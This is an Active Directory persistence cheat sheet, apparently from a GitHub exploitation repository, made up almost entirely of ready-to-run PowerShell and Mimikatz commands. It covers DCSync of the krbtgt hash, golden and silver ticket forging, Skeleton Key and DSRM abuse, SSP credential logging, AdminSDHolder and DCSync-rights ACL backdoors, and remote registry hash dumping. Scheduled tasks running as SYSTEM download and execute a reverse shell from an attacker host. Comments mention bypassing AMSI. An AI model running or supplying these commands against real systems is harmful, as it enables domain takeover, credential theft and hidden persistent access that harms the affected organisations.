## PERSISTENCE

#### DCSync feature for getting krbtgt hash
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```
#### ACCOUNT DUMPING
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername DC01
```

---
#### GOLDEN TICKET

:information_source: On any machine

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:lab.domain.local /sid:S-1-5-x-x-x-x /krbtgt:00000000000000000000000000000000 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
# Execute a task to run the reverse shell script
schtasks /create /S machine.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "taskname" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://attackerip/Invoke-PowerShellTcp.ps1''')'"
schtasks /Run /S machine.domain.local /TN "taskname"
```

Golden ticket parameters
| Invoke-Mimikatz -Command | Resume |
|---|---|
| kerberos::golden | Name of the module |
| /User:Administrator | Username for which the TGT is generated |
| /domain:lab.domain.local | Domain FQDN |
| /sid:S-1-5-x-x-x-x | SID of the domain |
| /krbtgt:00000000000000000000000000000000 | NTLM (RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys |
| /id:500 /groups:512 | Optional User RID (default 500) and Group default 513 512 520 518 519) |
| /ptt or /ticket | Injects the ticket in current PowerShell process - no need to save the ticket on disk - Saves the ticket to a file for later use |
| /startoffset:0 | Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future |
| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |

---
#### SILVER TICKET
- Using hash of the Domain Controller computer account
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:lab.domain.local /sid:S-1-5-x-x-x-x /target:DC01.lab.domain.local /service:CIFS /rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
# Generate Silver ticket with machine account Hash - WMI abuse
Invoke-Mimikatz -Command '"kerberos::golden /domain:target.local /sid:S-1-5-x-x-x-x /target:machine.target.local /service:HOST/rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /domain:target.local /sid:S-1-5-x-x-x-x /target:machine.target.local /service:RPCSS/rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
# Check WMI
Get-WmiObject -Class win32_operatingsystem -ComputerName machine.target.local
```

Silver ticket parameters
| Invoke-Mimikatz -Command | Resume |
|---|---|
| kerberos::golden | Name of the module (there is no Silver module!) |
| /User:Administrator | Username for which the TGT is generated |
| /domain:lab.domain.local | Domain FQDN |
| /sid:S-1-5-x-x-x-x | SID of the domain |
| /target:DC01.lab.domain.local | Target server FQDN |
| /service:cifs | The SPN name of service for which TGS is to be created |
| /rc4:00000000000000000000000000000000 | NTLM (RC4) hash of the service account. Use /aes128 and /aes256 for using AES keys |
| /id:500 /groups:512 | Optional User RID (default 500) and Group (default 513 512 520 518 519) |
| /ptt | Injects the ticket in current PowerShell process - no need to save the ticket on disk |
| /startoffset:0 | Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future |
| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |

- Create a silver ticket for the HOST SPN which will allow us to schedule a task
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:lab.domain.local /sid:S-1-5-x-x-x-x /target:DC01.lab.dmoain.local /service:HOST /rc4:00000000000000000000000000000000 /user:Administrator /ptt"'
# CONFIGURE REMOTE TASK
schtasks /create /S DC01.lab.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Abuse01" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10/Invoke-PowerShellTcp.ps1''')'"
# EXEC REMOTE TASK
schtasks /Run /S DC01.lab.domain.local /TN "Abuse01"
```

---
#### SKELETON KEY
```powershell
# REMOTE
$sess = New-PSSession DC01.domain.local
Enter-PSSession -Session $sess
# BYPASS AMSI AND EXIT
Invoke-Command -FilePath C:\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
# OR
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName DC01.lab.dmoain.local
# LOGIN
Enter-PSSession -Computername DC01 -credential domain\Administrator
# PASSWORD mimikatz
```
- Skeleton Key with lsass running as a protected process
```powershell
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```
:information_source: needs the mimikatz driver (mimidriv.sys) on disk of the target DC

---
#### DSRM
- Dump DSRM password (needs DA privs)
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername DC01
```
- Eneable DSRM account to login
```powershell
Enter-PSSession -Computername DC01
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
- Pass the DSRM hash
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:DC01 /user:Administrator
/ntlm:00000000000000000000000000000000 /run:powershell.exe"
```
- Dump local acconut
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername DC01
```
- FULL
```powershell
$sess = New-PSSession DC01.domain.local
Enter-PSSession -Session $sess
# BYPASS AMSI AND EXIT
Invoke-Command -FilePath C:\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# ALLOW DSRM ADMINISTRATOR TO LOGIN
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# PASS THE HASH DSRM ADMINISTRATOR
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:00000000000000000000000000000000 /run:powershell.exe"'
```

---
#### Security Support Provider (SSP)
```powershell
# Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
$packages = Get-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

Invoke-Mimikatz -Command '"misc::memssp"'
# CHECK C:\Windows\system32\kiwissp.log
```

---
#### ADMINSDHOLDER
- Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL

| Protected Groups | |
| --- | --- |
| Account Operators | Enterprise Admins |
| Backup Operators | Domain Controllers |
| Server Operators | Read-only Domain Controllers |
| Print Operators | Schema Admins |
| Domain Admins | Administrators |
| Replicator | |

- Well known abuse

| Groups | Resume |
| --- | --- |
| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within 
| Backup Operators | Backup GPO, edit to add SID of controlled account to a privileged group and Restore |
| Server Operators | Run a command as system (using the disabled Browser service) |
| Print Operators | Copy ntds.dit backup, load device drivers |

- Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Rights All -Verbose
```
- Using ActiveDirectory Module and Set-ADACL
```powershell
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=test,DC=domain,DC=local' -Principal attacker -Verbose
```
- Interesting permissions (ResetPassword, WriteMembers)
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Rights ResetPassword -Verbose
#
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Rights WriteMembers -Verbose
```
- Run SDProp manually
```powershell
Import-Module Invoke-SDPropagator.ps1
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```
- Check the Domain Admins permission
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=lab,DC=domain,DC=local').Access | ?{$_.IdentityReference -match 'attacker'}
```
- Abusing FullControl using PowerView_dev
```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members attackerda -Verbose
Add-ADGroupMember -Identity 'Domain Admins' -Members attackerda
```
- Abusing ResetPassword using PowerView_dev
```powershell
Set-DomainUserPassword -Identity targetaccount -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
Set-ADAccountPassword -Identity targetaccount -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

---
### CHECK REPLICATION RIGHTS, MODIFY, DCSYNC ATTACK
```powershell
# CHECK
. .\PowerView.ps1
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "targetuser") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}

# ADD OBJECT ACL
Add-ObjectAcl -TargetDistinguishedName "dc=domain,dc=local" -PrincipalSamAccountName targetuser -Rights DCSync -Verbose

# DCSYNC
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "targetuser") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

#### Rights Abuse
- Add FullControl rights
```powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=lab,DC=domain,DC=local' -PrincipalSamAccountName john -Rights All -Verbose
```
- Using ActiveDirectory Module and Set-ADACL
```powershell
Set-ADACL -DistinguishedName 'DC=lab,DC=domain,DC=local' -Principal john -Verbose
```
- Add rights for DCSync
```powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=lab,DC=domain,DC=local' -PrincipalSamAccountName bob -Rights DCSync -Verbose
```
- Using ActiveDirectory Module and Set-ADACL
```powershell
Set-ADACL -DistinguishedName 'DC=lab,DC=domain,DC=local' -Principal bob -GUIDRight DCSync -Verbose
```
- Execute DCSync
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

---
#### SECURITY DESCRIPTORS
- ACLs can be modified to allow non-admin users access to securable objects

- WMI
    - On local machine for jane
    ```powershell
    Set-RemoteWMI -UserName jane -Verbose
    ```
    - On remote machine for jane without explicit credentials
    ```powershell
    Set-RemoteWMI -UserName jame -ComputerName DC01 -namespace 'root\cimv2' -Verbose
    ```
    - On remote machine with explicit credentials
    ```powershell
    Set-RemoteWMI -UserName jane -ComputerName DC01 -Credential Administrator -namespace 'root\cimv2' -Verbose
    ```
    - On remote machine remove permissions
    ```powershell
    Set-RemoteWMI -UserName jane -ComputerName DC01 -namespace 'root\cimv2' -Remove -Verbose
    ```

- PSREMOTE
    - On local machine for joe
    ```powershell
    Set-RemotePSRemoting -UserName joe -Verbose
    ```
    - On remote machine for joe without credentials
    ```powershell
    Set-RemotePSRemoting -UserName joe -ComputerName DC01 -Verbose
    ```
    - On remote machine, remove the permissions
    ```powershell
    Set-RemotePSRemoting -UserName joe -ComputerName DC01 -Remove
    ```

- REMOTE REGISTRY
    - Using DAMP, with admin privs on remote machine
    ```powershell
    Add-RemoteRegBackdoor -ComputerName DC01 -Trustee jack -Verbose
    ```
    - As jack, retrieve machine account hash
    ```powershell
    Get-RemoteMachineAccountHash -ComputerName DC01 -Verbose
    ```
    - Retrieve local account hash
    ```powershell
    Get-RemoteLocalAccountHash -ComputerName DC01 -Verbose
    ```
    - Retrieve domain cached credentials
    ```powershell
    Get-RemoteCachedCredential -ComputerName DC01 -Verbose
    ```

[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)